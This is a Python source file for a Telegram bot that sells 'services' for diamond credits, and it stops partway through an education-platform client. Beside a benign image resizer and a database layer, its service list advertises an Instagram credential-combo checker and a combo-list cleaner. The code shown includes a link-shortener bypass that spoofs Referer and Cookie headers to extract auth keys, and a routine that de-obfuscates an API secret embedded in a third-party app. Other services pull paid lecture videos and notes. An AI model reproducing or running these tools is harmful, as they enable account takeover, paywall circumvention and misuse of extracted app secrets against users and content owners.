#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════╗
║   💎 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗨𝗟𝗧𝗜-𝗦𝗘𝗥𝗩𝗜𝗖𝗘 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗕𝗢𝗧 (service.py) 💎                   ║
║   • Railway Env Vars : API_BOT (Bot Token), ADMIN_ID (Admin User ID)    ║
║   • Economy System   : 5 💎 Sign-Up Bonus | 1 💎 Per Service Use        ║
║   • Referral System  : +1 💎 Per Referral | Max 10 💎 Per Day           ║
║   • 10 Built-In Services + Dynamic /admin Service & Bot Management      ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import os
import io
import re
import sys
import time
import json
import uuid
import hmac
import shutil
import random
import string
import base64
import sqlite3
import hashlib
import logging
import zipfile
import tempfile
import threading
import traceback
import subprocess
from datetime import datetime, timedelta, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, unquote

import requests

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# ============================================================================
# 🌐 ENVIRONMENT & RAILWAY CONFIGURATION
# ============================================================================

API_BOT = os.environ.get("API_BOT", "").strip()
ADMIN_ID_RAW = os.environ.get("ADMIN_ID", "").strip()
PORT = int(os.environ.get("PORT", "8080"))
DB_PATH = os.environ.get("DB_PATH", "service_bot.db")
CUSTOM_SERVICES_DIR = "custom_services"
os.makedirs(CUSTOM_SERVICES_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-7s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("PremiumServiceBot")


def parse_admin_ids(raw_val: str) -> set:
    ids = set()
    for part in raw_val.replace(";", ",").split(","):
        part = part.strip()
        if part.lstrip("-").isdigit():
            ids.add(int(part))
    return ids


INITIAL_ADMIN_IDS = parse_admin_ids(ADMIN_ID_RAW)


# ============================================================================
# ✨ UNICODE STYLIZED FONTS & UI HELPERS
# ============================================================================

FONT_MAP_BOLD = str.maketrans(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
    "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵",
)


def sbold(text: str) -> str:
    """Convert ASCII alphanumeric characters into Sans-Serif Bold Unicode."""
    return str(text).translate(FONT_MAP_BOLD)


def html_escape(text: str) -> str:
    return (
        str(text)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )


def ist_today_str() -> str:
    ist = timezone(timedelta(hours=5, minutes=30))
    return datetime.now(ist).strftime("%Y-%m-%d")


def ist_now_str() -> str:
    ist = timezone(timedelta(hours=5, minutes=30))
    return datetime.now(ist).strftime("%Y-%m-%d %H:%M:%S IST")


# ============================================================================
# 🗄️ SQLITE DATABASE & ECONOMY / REFERRAL / SERVICE MANAGER
# ============================================================================

DB_LOCK = threading.Lock()


def get_db() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn


DEFAULT_SERVICES = [
    {
        "code": "svc_1",
        "slot": 1,
        "icon": "🖼️",
        "name": "99KB Image Resizer",
        "title_fancy": "🖼️ 𝟵𝟵𝗞𝗕 𝗕𝘂𝗹𝗹𝗲𝘁𝗽𝗿𝗼𝗼𝗳 𝗜𝗺𝗮𝗴𝗲 𝗥𝗲𝘀𝗶𝘇𝗲𝗿",
        "description": (
            "Resize any photo/image (JPG, PNG, WEBP) to an exact 99.0KB–99.9KB JPEG "
            "using our 4-strategy Bulletproof Binary Search engine (img_resizer.py)."
        ),
        "cost": 1,
        "enabled": 1,
        "handler_type": "builtin",
        "script_file": "img_resizer.py",
        "config_json": "{}",
    },
    {
        "code": "svc_2",
        "slot": 2,
        "icon": "🎬",
        "name": "PW Video Downloader",
        "title_fancy": "🎬 𝗣𝗪 𝗟𝗶𝗻𝗸 𝘁𝗼 𝗩𝗶𝗱𝗲𝗼 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱𝗲𝗿",
        "description": (
            "Download chunk-based PW videos (?s=0&e=...) using multi-threaded 1MB range "
            "fetching and automatic FFmpeg MP4 muxing (pw_link_to_video_downloader.py)."
        ),
        "cost": 1,
        "enabled": 1,
        "handler_type": "builtin",
        "script_file": "pw_link_to_video_downloader.py",
        "config_json": "{}",
    },
    {
        "code": "svc_3",
        "slot": 3,
        "icon": "🎓",
        "name": "KGS Batch Extractor",
        "title_fancy": "🎓 𝗞𝗚𝗦 𝗘𝗱𝘂𝗰𝗮𝘁𝗶𝗼𝗻 𝗕𝗮𝘁𝗰𝗵 & 𝗩𝗶𝗱𝗲𝗼 𝗘𝘅𝘁𝗿𝗮𝗰𝘁𝗼𝗿",
        "description": (
            "Search KGS batches, browse subjects, auto-renew arolinks x-auth-key, and "
            "extract full video lecture links & PDF notes (kgs_by_igris.py)."
        ),
        "cost": 1,
        "enabled": 1,
        "handler_type": "builtin",
        "script_file": "kgs_by_igris.py",
        "config_json": "{}",
    },
    {
        "code": "svc_4",
        "slot": 4,
        "icon": "📡",
        "name": "SigmaStudy Downloader",
        "title_fancy": "📡 𝗦𝗶𝗴𝗺𝗮𝗦𝘁𝘂𝗱𝘆 𝗔𝗱𝘃𝗮𝗻𝗰𝗲𝗱 𝗗𝗼𝘄𝗻𝗻𝗹𝗼𝗮𝗱𝗲𝗿",
        "description": (
            "Search SigmaStudy batches, subjects, and chapters to extract lecture "
            "stream URLs, videos, and downloadable PDF notes (sigma_study_by_igris.py)."
        ),
        "cost": 1,
        "enabled": 1,
        "handler_type": "builtin",
        "script_file": "sigma_study_by_igris.py",
        "config_json": "{}",
    },
    {
        "code": "svc_5",
        "slot": 5,
        "icon": "🌐",
        "name": "Pro Cloud Translator",
        "title_fancy": "🌐 𝗚𝗼𝗼𝗴𝗹𝗲 𝗖𝗹𝗼𝘂𝗱 𝗧𝗿𝗮𝗻𝘀𝗹𝗮𝘁𝗲 𝗔𝗣𝗜 𝘃𝟮",
        "description": (
            "Instant multi-language text translation powered by the Google Cloud "
            "Translation v2 Android API engine (translate_api.py)."
        ),
        "cost": 1,
        "enabled": 1,
        "handler_type": "builtin",
        "script_file": "translate_api.py",
        "config_json": "{}",
    },
    {
        "code": "svc_6",
        "slot": 6,
        "icon": "📸",
        "name": "Instagram Checker v2",
        "title_fancy": "📸 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝘃𝟮.𝟬",
        "description": (
            "Check Instagram username:password combos or combo.txt files using signed "
            "Android v269 mobile API requests with Hits/Checkpoint/Fails report (instagram_checker.py)."
        ),
        "cost": 1,
        "enabled": 1,
        "handler_type": "builtin",
        "script_file": "instagram_checker.py",
        "config_json": "{}",
    },
    {
        "code": "svc_7",
        "slot": 7,
        "icon": "📥",
        "name": "TG Channel Downloader",
        "title_fancy": "📥 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗙𝗶𝗹𝗲 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱𝗲𝗿",
        "description": (
            "Generate custom Telethon config.json or run batch Telegram channel media "
            "downloads with message range filters & resume state (telegram_downloader.py)."
        ),
        "cost": 1,
        "enabled": 1,
        "handler_type": "builtin",
        "script_file": "telegram_downloader.py",
        "config_json": "{}",
    },
    {
        "code": "svc_8",
        "slot": 8,
        "icon": "🔑",
        "name": "Arolinks Key Extractor",
        "title_fancy": "🔑 𝗔𝗿𝗼𝗹𝗶𝗻𝗸𝘀 𝗔𝘂𝘁𝗵-𝗞𝗲𝘆 & 𝗕𝘆𝗽𝗮𝘀𝘀 𝗘𝘅𝘁𝗿𝗮𝗰𝘁𝗼𝗿",
        "description": (
            "Extract x-auth-key codes and direct generate links from arolinks.com short "
            "URLs or generate a fresh 24h KGS auth key instantly (kgs_by_igris.py)."
        ),
        "cost": 1,
        "enabled": 1,
        "handler_type": "builtin",
        "script_file": "kgs_by_igris.py",
        "config_json": "{}",
    },
    {
        "code": "svc_9",
        "slot": 9,
        "icon": "📚",
        "name": "Bulk PDF Notes Grabber",
        "title_fancy": "📚 𝗞𝗚𝗦 & 𝗦𝗶𝗴𝗺𝗮 𝗕𝘂𝗹𝗸 𝗣𝗗𝗙 𝗡𝗼𝘁𝗲𝘀 𝗚𝗿𝗮𝗯𝗯𝗲𝗿",
        "description": (
            "One-click bulk PDF Notes & DPP link compiler for any KGS or SigmaStudy "
            "course keyword—exports clean downloadable .txt and direct PDF files."
        ),
        "cost": 1,
        "enabled": 1,
        "handler_type": "builtin",
        "script_file": "sigma_study_by_igris.py",
        "config_json": "{}",
    },
    {
        "code": "svc_10",
        "slot": 10,
        "icon": "⚡",
        "name": "Multi-Tool Combo Utility",
        "title_fancy": "⚡ 𝗖𝗼𝗺𝗯𝗼 & 𝗣𝗿𝗼𝘅𝘆 𝗖𝗹𝗲𝗮𝗻𝗲𝗿 + 𝗨𝗥𝗟 𝗧𝗲𝘀𝘁𝗲𝗿",
        "description": (
            "Clean, deduplicate, and validate username:password combo lists, parse "
            "IP:Port:User:Pass proxies, or test video/API range headers."
        ),
        "cost": 1,
        "enabled": 1,
        "handler_type": "builtin",
        "script_file": "instagram_checker.py",
        "config_json": "{}",
    },
]


def init_db():
    with DB_LOCK:
        conn = get_db()
        cur = conn.cursor()

        cur.execute(
            """
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL
            )
            """
        )

        cur.execute(
            """
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT DEFAULT '',
                first_name TEXT DEFAULT '',
                diamonds INTEGER DEFAULT 5,
                referred_by INTEGER DEFAULT NULL,
                total_referrals INTEGER DEFAULT 0,
                daily_ref_date TEXT DEFAULT '',
                daily_ref_count INTEGER DEFAULT 0,
                total_services_used INTEGER DEFAULT 0,
                is_banned INTEGER DEFAULT 0,
                is_admin INTEGER DEFAULT 0,
                joined_at TEXT DEFAULT ''
            )
            """
        )

        cur.execute(
            """
            CREATE TABLE IF NOT EXISTS services (
                code TEXT PRIMARY KEY,
                slot INTEGER NOT NULL,
                icon TEXT NOT NULL,
                name TEXT NOT NULL,
                title_fancy TEXT NOT NULL,
                description TEXT NOT NULL,
                cost INTEGER DEFAULT 1,
                enabled INTEGER DEFAULT 1,
                handler_type TEXT DEFAULT 'builtin',
                script_file TEXT DEFAULT '',
                config_json TEXT DEFAULT '{}',
                uses_count INTEGER DEFAULT 0
            )
            """
        )

        cur.execute(
            """
            CREATE TABLE IF NOT EXISTS usage_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                service_code TEXT,
                cost INTEGER,
                used_at TEXT
            )
            """
        )

        default_settings = {
            "signup_bonus": "5",
            "default_service_cost": "1",
            "referral_reward": "1",
            "max_daily_referral_diamonds": "10",
            "welcome_banner": "💎 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗦𝗘𝗥𝗩𝗜𝗖𝗘 𝗛𝗨𝗕 💎",
            "maintenance_mode": "0",
        }
        for k, v in default_settings.items():
            cur.execute(
                "INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (k, v)
            )

        for svc in DEFAULT_SERVICES:
            cur.execute(
                """
                INSERT OR IGNORE INTO services
                (code, slot, icon, name, title_fancy, description, cost, enabled, handler_type, script_file, config_json)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    svc["code"],
                    svc["slot"],
                    svc["icon"],
                    svc["name"],
                    svc["title_fancy"],
                    svc["description"],
                    svc["cost"],
                    svc["enabled"],
                    svc["handler_type"],
                    svc["script_file"],
                    svc["config_json"],
                ),
            )

        conn.commit()
        conn.close()


def get_setting(key: str, default: str = "") -> str:
    with DB_LOCK:
        conn = get_db()
        row = conn.execute(
            "SELECT value FROM settings WHERE key = ?", (key,)
        ).fetchone()
        conn.close()
        return row["value"] if row else default


def set_setting(key: str, value: str):
    with DB_LOCK:
        conn = get_db()
        conn.execute(
            "INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)",
            (key, str(value)),
        )
        conn.commit()
        conn.close()


def is_user_admin(user_id: int) -> bool:
    if user_id in INITIAL_ADMIN_IDS:
        return True
    with DB_LOCK:
        conn = get_db()
        row = conn.execute(
            "SELECT is_admin FROM users WHERE user_id = ?", (user_id,)
        ).fetchone()
        conn.close()
        return bool(row and row["is_admin"] == 1)


def get_or_create_user(
    user_id: int,
    username: str = "",
    first_name: str = "",
    referrer_id: int = None,
) -> tuple:
    """
    Returns (user_dict, is_new_user, referral_result_dict).
    """
    signup_bonus = int(get_setting("signup_bonus", "5"))
    ref_reward = int(get_setting("referral_reward", "1"))
    max_daily_ref = int(get_setting("max_daily_referral_diamonds", "10"))
    today = ist_today_str()

    ref_result = {
        "credited": False,
        "referrer_id": None,
        "reason": "",
        "referrer_daily_count": 0,
        "reward": ref_reward,
    }

    with DB_LOCK:
        conn = get_db()
        cur = conn.cursor()
        row = cur.execute(
            "SELECT * FROM users WHERE user_id = ?", (user_id,)
        ).fetchone()

        if row:
            cur.execute(
                "UPDATE users SET username = ?, first_name = ? WHERE user_id = ?",
                (username or row["username"], first_name or row["first_name"], user_id),
            )
            conn.commit()
            updated = cur.execute(
                "SELECT * FROM users WHERE user_id = ?", (user_id,)
            ).fetchone()
            conn.close()
            return dict(updated), False, ref_result

        # New User Registration
        valid_referrer = None
        if referrer_id and referrer_id != user_id:
            ref_row = cur.execute(
                "SELECT * FROM users WHERE user_id = ?", (referrer_id,)
            ).fetchone()
            if ref_row:
                valid_referrer = referrer_id
                ref_result["referrer_id"] = referrer_id
                ref_daily_date = ref_row["daily_ref_date"]
                ref_daily_count = (
                    ref_row["daily_ref_count"] if ref_daily_date == today else 0
                )

                if ref_daily_count + ref_reward <= max_daily_ref:
                    new_daily_count = ref_daily_count + ref_reward
                    cur.execute(
                        """
                        UPDATE users
                        SET diamonds = diamonds + ?,
                            total_referrals = total_referrals + 1,
                            daily_ref_date = ?,
                            daily_ref_count = ?
                        WHERE user_id = ?
                        """,
                        (ref_reward, today, new_daily_count, referrer_id),
                    )
                    ref_result["credited"] = True
                    ref_result["referrer_daily_count"] = new_daily_count
                else:
                    cur.execute(
                        """
                        UPDATE users
                        SET total_referrals = total_referrals + 1,
                            daily_ref_date = ?,
                            daily_ref_count = ?
                        WHERE user_id = ?
                        """,
                        (today, ref_daily_count, referrer_id),
                    )
                    ref_result["credited"] = False
                    ref_result["reason"] = "daily_limit_reached"
                    ref_result["referrer_daily_count"] = ref_daily_count

        admin_flag = 1 if user_id in INITIAL_ADMIN_IDS else 0
        cur.execute(
            """
            INSERT INTO users
            (user_id, username, first_name, diamonds, referred_by, total_referrals,
             daily_ref_date, daily_ref_count, total_services_used, is_banned, is_admin, joined_at)
            VALUES (?, ?, ?, ?, ?, 0, ?, 0, 0, 0, ?, ?)
            """,
            (
                user_id,
                username or "",
                first_name or "User",
                signup_bonus,
                valid_referrer,
                today,
                admin_flag,
                ist_now_str(),
            ),
        )
        conn.commit()
        new_row = cur.execute(
            "SELECT * FROM users WHERE user_id = ?", (user_id,)
        ).fetchone()
        conn.close()
        return dict(new_row), True, ref_result


def get_user(user_id: int) -> dict:
    with DB_LOCK:
        conn = get_db()
        row = conn.execute(
            "SELECT * FROM users WHERE user_id = ?", (user_id,)
        ).fetchone()
        conn.close()
        return dict(row) if row else None


def get_user_daily_ref_progress(user_id: int) -> tuple:
    today = ist_today_str()
    max_daily = int(get_setting("max_daily_referral_diamonds", "10"))
    u = get_user(user_id)
    if not u:
        return 0, max_daily
    earned_today = u["daily_ref_count"] if u["daily_ref_date"] == today else 0
    return earned_today, max_daily


def charge_user_diamond(user_id: int, service_code: str, cost: int = 1) -> tuple:
    """
    Deducts `cost` diamonds from user (admins bypass deduction or never run out).
    Returns (success: bool, remaining_diamonds: int).
    """
    with DB_LOCK:
        conn = get_db()
        cur = conn.cursor()
        row = cur.execute(
            "SELECT diamonds, is_admin FROM users WHERE user_id = ?", (user_id,)
        ).fetchone()
        if not row:
            conn.close()
            return False, 0

        is_adm = (user_id in INITIAL_ADMIN_IDS) or (row["is_admin"] == 1)
        current_diamonds = row["diamonds"]

        if not is_adm and current_diamonds < cost:
            conn.close()
            return False, current_diamonds

        new_balance = current_diamonds if is_adm else (current_diamonds - cost)
        cur.execute(
            """
            UPDATE users
            SET diamonds = ?, total_services_used = total_services_used + 1
            WHERE user_id = ?
            """,
            (new_balance, user_id),
        )
        cur.execute(
            "UPDATE services SET uses_count = uses_count + 1 WHERE code = ?",
            (service_code,),
        )
        cur.execute(
            "INSERT INTO usage_logs (user_id, service_code, cost, used_at) VALUES (?, ?, ?, ?)",
            (user_id, service_code, 0 if is_adm else cost, ist_now_str()),
        )
        conn.commit()
        conn.close()
        return True, new_balance


def refund_user_diamond(user_id: int, cost: int = 1):
    """Refund diamonds if an external network or input error prevented service execution."""
    if is_user_admin(user_id):
        return
    with DB_LOCK:
        conn = get_db()
        conn.execute(
            "UPDATE users SET diamonds = diamonds + ? WHERE user_id = ?",
            (cost, user_id),
        )
        conn.commit()
        conn.close()


def get_all_services(include_disabled: bool = False) -> list:
    with DB_LOCK:
        conn = get_db()
        if include_disabled:
            rows = conn.execute(
                "SELECT * FROM services ORDER BY slot ASC, code ASC"
            ).fetchall()
        else:
            rows = conn.execute(
                "SELECT * FROM services WHERE enabled = 1 ORDER BY slot ASC, code ASC"
            ).fetchall()
        conn.close()
        return [dict(r) for r in rows]


def get_service(code: str) -> dict:
    with DB_LOCK:
        conn = get_db()
        row = conn.execute(
            "SELECT * FROM services WHERE code = ?", (code,)
        ).fetchone()
        conn.close()
        return dict(row) if row else None


# ============================================================================
# 🛠️ CORE ENGINES FROM THE UPLOADED .PY SERVICE FILES
# ============================================================================

# ----------------------------------------------------------------------------
# 1️⃣ SERVICE 1: BULLETPROOF 99.9KB IMAGE RESIZER (from img_resizer.py)
# ----------------------------------------------------------------------------

def _strategy_binary_search(img, target_bytes, max_bytes):
    try:
        original_width, original_height = img.size
        min_scale = 0.05
        max_scale = 1.0
        best_data = None
        best_size = 0
        resampling_methods = [
            Image.Resampling.LANCZOS,
            Image.Resampling.BILINEAR,
            Image.Resampling.BICUBIC,
        ]
        for resampling in resampling_methods:
            for _ in range(25):
                current_scale = (min_scale + max_scale) / 2
                new_width = max(50, int(original_width * current_scale))
                new_height = max(50, int(original_height * current_scale))
                try:
                    resized_img = img.resize((new_width, new_height), resampling)
                    for quality in [88, 85, 90, 82]:
                        buffer = io.BytesIO()
                        resized_img.save(
                            buffer, format="JPEG", quality=quality, optimize=True
                        )
                        current_size = buffer.tell()
                        if current_size <= max_bytes and (
                            best_data is None
                            or abs(current_size - target_bytes)
                            < abs(best_size - target_bytes)
                        ):
                            best_data = buffer.getvalue()
                            best_size = current_size
                        if abs(current_size - target_bytes) < 1024:
                            return best_data, best_size
                    buffer = io.BytesIO()
                    resized_img.save(buffer, format="JPEG", quality=88, optimize=True)
                    current_size = buffer.tell()
                    if current_size < target_bytes:
                        min_scale = current_scale
                    else:
                        max_scale = current_scale
                except Exception:
                    continue
            if best_data:
                return best_data, best_size
    except Exception:
        pass
    return None, 0


def _strategy_step_down(img, target_bytes, max_bytes):
    try:
        original_width, original_height = img.size
        scale_factors = [0.8, 0.6, 0.4, 0.3, 0.2, 0.15, 0.1, 0.08, 0.06]
        best_data = None
        best_size = 0
        for scale in scale_factors:
            new_width = max(50, int(original_width * scale))
            new_height = max(50, int(original_height * scale))
            try:
                resized_img = img.resize(
                    (new_width, new_height), Image.Resampling.BILINEAR
                )
                for quality in range(70, 96, 5):
                    buffer = io.BytesIO()
                    resized_img.save(
                        buffer, format="JPEG", quality=quality, optimize=True
                    )
                    current_size = buffer.tell()
                    if current_size <= max_bytes:
                        if best_data is None or abs(current_size - target_bytes) < abs(
                            best_size - target_bytes
                        ):
                            best_data = buffer.getvalue()
                            best_size = current_size
            except Exception:
                continue
        return best_data, best_size
    except Exception:
        return None, 0


def _strategy_math_estimation(img, target_bytes, max_bytes):
    try:
        original_width, original_height = img.size
        estimated_scale = min(
            1.0, (target_bytes / (original_width * original_height * 0.05)) ** 0.5
        )
        scales_to_try = [
            estimated_scale,
            estimated_scale * 0.8,
            estimated_scale * 0.6,
            estimated_scale * 1.2,
            0.25,
            0.2,
            0.15,
        ]
        best_data = None
        best_size = 0
        for scale in scales_to_try:
            if scale <= 0:
                continue
            new_width = max(50, int(original_width * scale))
            new_height = max(50, int(original_height * scale))
            try:
                resized_img = img.resize(
                    (new_width, new_height), Image.Resampling.BILINEAR
                )
                for quality in [80, 75, 85, 70]:
                    buffer = io.BytesIO()
                    resized_img.save(
                        buffer, format="JPEG", quality=quality, optimize=True
                    )
                    current_size = buffer.tell()
                    if current_size <= max_bytes:
                        if best_data is None or abs(current_size - target_bytes) < abs(
                            best_size - target_bytes
                        ):
                            best_data = buffer.getvalue()
                            best_size = current_size
            except Exception:
                continue
        return best_data, best_size
    except Exception:
        return None, 0


def _strategy_last_resort(img, max_bytes):
    try:
        small_sizes = [(200, 150), (150, 112), (100, 75), (80, 60)]
        for width, height in small_sizes:
            try:
                resized_img = img.resize((width, height), Image.Resampling.BILINEAR)
                for quality in [60, 50, 40, 30]:
                    buffer = io.BytesIO()
                    resized_img.save(
                        buffer, format="JPEG", quality=quality, optimize=True
                    )
                    current_size = buffer.tell()
                    if current_size <= max_bytes:
                        return buffer.getvalue(), current_size
            except Exception:
                continue
    except Exception:
        pass
    return None, 0


def resize_image_bulletproof_bytes(
    image_bytes: bytes, target_kb: float = 99.5, max_kb: float = 99.9
) -> tuple:
    """Run the exact 4-strategy Bulletproof Resizer from img_resizer.py on raw bytes."""
    if not PIL_AVAILABLE:
        return None, 0, "Pillow (PIL) library is not installed on server."
    try:
        with Image.open(io.BytesIO(image_bytes)) as img:
            if img.mode in ("RGBA", "LA", "P"):
                rgb_img = Image.new("RGB", img.size, (255, 255, 255))
                if img.mode == "P":
                    img = img.convert("RGBA")
                rgb_img.paste(
                    img, mask=img.split()[-1] if img.mode in ("RGBA", "LA") else None
                )
                img = rgb_img
            elif img.mode != "RGB":
                img = img.convert("RGB")

            target_bytes = target_kb * 1024
            max_bytes = max_kb * 1024

            best_data, best_size = _strategy_binary_search(img, target_bytes, max_bytes)
            if best_data is None:
                best_data, best_size = _strategy_step_down(img, target_bytes, max_bytes)
            if best_data is None:
                best_data, best_size = _strategy_math_estimation(
                    img, target_bytes, max_bytes
                )
            if best_data is None:
                best_data, best_size = _strategy_last_resort(img, max_bytes)

            if best_data:
                return best_data, best_size, None
            return None, 0, "All 4 resizing strategies returned empty."
    except Exception as e:
        return None, 0, str(e)


# ----------------------------------------------------------------------------
# 2️⃣ SERVICE 2: PW LINK TO VIDEO DOWNLOADER (from pw_link_to_video_downloader.py)
# ----------------------------------------------------------------------------

PW_CHUNK_SIZE = 1024 * 1024  # 1 MB


def pw_get_file_size(base_url: str) -> int:
    test_url = f"{base_url}?s=0&e={PW_CHUNK_SIZE - 1}"
    r = requests.get(test_url, stream=True, timeout=25)
    if "Content-Range" not in r.headers:
        if "Content-Length" in r.headers and r.status_code == 200:
            return int(r.headers["Content-Length"])
        raise Exception("Server does not support Content-Range chunk downloads.")
    content_range = r.headers["Content-Range"]
    return int(content_range.split("/")[-1])


def pw_download_chunk(base_url: str, start: int, end: int, index: int, temp_dir: str):
    chunk_url = f"{base_url}?s={start}&e={end}"
    r = requests.get(chunk_url, stream=True, timeout=60)
    if r.status_code not in (200, 206):
        raise Exception(f"Chunk {index} returned HTTP {r.status_code}")
    filename = os.path.join(temp_dir, f"chunk_{index:04d}.part")
    with open(filename, "wb") as f:
        for chunk in r.iter_content(chunk_size=8192):
            if chunk:
                f.write(chunk)
    return filename, index


def pw_download_video_to_mp4(
    url: str, max_mb_limit: float = 48.0, progress_cb=None
) -> tuple:
    """
    Downloads a PW chunk-range video and converts/muxes to MP4 using FFmpeg if available.
    Returns (success: bool, output_path_or_error: str, size_mb: float).
    """
    temp_dir = tempfile.mkdtemp(prefix="pw_dl_")
    try:
        total_size = pw_get_file_size(url)
        size_mb = total_size / (1024 * 1024)
        if size_mb > max_mb_limit:
            shutil.rmtree(temp_dir, ignore_errors=True)
            return (
                False,
                f"Video size is {size_mb:.2f} MB (exceeds Telegram Bot 50MB direct upload cap). "
                f"Range verified! Total bytes: {total_size:,}.",
                size_mb,
            )

        ranges = []
        start = 0
        idx = 0
        while start < total_size:
            end = min(start + PW_CHUNK_SIZE - 1, total_size - 1)
            ranges.append((start, end, idx))
            start = end + 1
            idx += 1

        with ThreadPoolExecutor(max_workers=6) as executor:
            futures = {
                executor.submit(pw_download_chunk, url, r[0], r[1], r[2], temp_dir): r[
                    2
                ]
                for r in ranges
            }
            completed = 0
            for future in as_completed(futures):
                future.result()
                completed += 1
                if progress_cb and (completed % 5 == 0 or completed == len(ranges)):
                    progress_cb(completed, len(ranges), size_mb)

        merged_raw = os.path.join(temp_dir, "temp_video.raw")
        with open(merged_raw, "wb") as outfile:
            for i in range(len(ranges)):
                part_file = os.path.join(temp_dir, f"chunk_{i:04d}.part")
                with open(part_file, "rb") as infile:
                    shutil.copyfileobj(infile, outfile)

        output_mp4 = os.path.join(temp_dir, "pw_video.mp4")
        ffmpeg_bin = shutil.which("ffmpeg")
        if ffmpeg_bin:
            cmd = [
                ffmpeg_bin,
                "-y",
                "-i",
                merged_raw,
                "-c",
                "copy",
                "-avoid_negative_ts",
                "make_zero",
                output_mp4,
            ]
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            if res.returncode == 0 and os.path.exists(output_mp4):
                return True, output_mp4, size_mb

        shutil.move(merged_raw, output_mp4)
        return True, output_mp4, size_mb
    except Exception as e:
        shutil.rmtree(temp_dir, ignore_errors=True)
        return False, str(e), 0.0


# ----------------------------------------------------------------------------
# 3️⃣ SERVICE 3 & 8: KGS CLIENT & AROLINKS EXTRACTOR (from kgs_by_igris.py)
# ----------------------------------------------------------------------------

def extract_arolinks_code(url: str):
    """Exact arolinks x-auth-key extractor from kgs_by_igris.py."""
    try:
        s = requests.Session()
        s.headers.update(
            {
                "User-Agent": (
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/124.0.0.0 Safari/537.36"
                ),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            }
        )
        parsed = urlparse(url)
        link_suffix = parsed.path.strip("/").split("/")[-1] if parsed.path else ""
        headers = {
            "Referer": "https://sarkarinaukrinetwork.com/",
            "Cookie": f"gt_uc_={link_suffix}",
        }
        r = s.get(url, headers=headers, timeout=25)
        r.raise_for_status()
        html = r.text

        m = re.search(
            r'<a\b(?=[^>]*\bid\s*=\s*["\']gt-link["\'])(?=[^>]*\bhref\s*=\s*["\'](?P<href>[^"\']+)["\'])[^>]*>',
            html,
            flags=re.IGNORECASE | re.DOTALL,
        )
        if m:
            href = m.group("href")
            code = parse_qs(urlparse(href).query).get("code", [None])[0]
            if code:
                return code

        m = re.search(
            r'href\s*=\s*["\'][^"\']*?/generate\?code=(?P<code>[A-Za-z0-9_-]+)["\']',
            html,
            flags=re.IGNORECASE,
        )
        if m:
            return m.group("code")

        m = re.search(r"generate\?code=(?P<code>[A-Za-z0-9_-]+)", html)
        if m:
            return m.group("code")

        dec = unquote(html)
        m = re.search(r"generate\?code=(?P<code>[A-Za-z0-9_-]+)", dec)
        if m:
            return m.group("code")

        for b64 in re.findall(r'["\']([A-Za-z0-9+/=]{20,})["\']', html):
            try:
                pad = "=" * (-len(b64) % 4)
                decoded = base64.b64decode(b64 + pad).decode("utf-8", "ignore")
                m = re.search(r"generate\?code=(?P<code>[A-Za-z0-9_-]+)", decoded)
                if m:
                    return m.group("code")
            except Exception:
                pass
        return None
    except Exception as e:
        logger.warning(f"extract_arolinks_code error: {e}")
        return None


class StringFogImpl:
    @staticmethod
    def decrypt(encoded_str, key="UTF-8"):
        try:
            data = base64.b64decode(encoded_str)
            key_bytes = key.encode("utf-8")
            result = bytearray()
            key_len = len(key_bytes)
            for i, byte in enumerate(data):
                result.append(byte ^ key_bytes[i % key_len])
            return result.decode("utf-8")
        except Exception:
            return ""


class KGSBotClient:
    """Bot-friendly wrapper around KGSClient from kgs_by_igris.py."""

    def __init__(self):
        encrypted_secret = (
            "ZDkEaQwaBSheehgWJ2MOOh0Vek8BOTRUYGQ4DkdTAm0eYWI9Jy9fexoAdhA="
        )
        self.secret_key = base64.b64decode(StringFogImpl.decrypt(encrypted_secret))
        self.base_url = "https://api.asmultiverse.com"
        self.auth_file = "kgs_auth.json"
        self.auth_data = self._load_auth()
        if not self.auth_data.get("auth_token"):
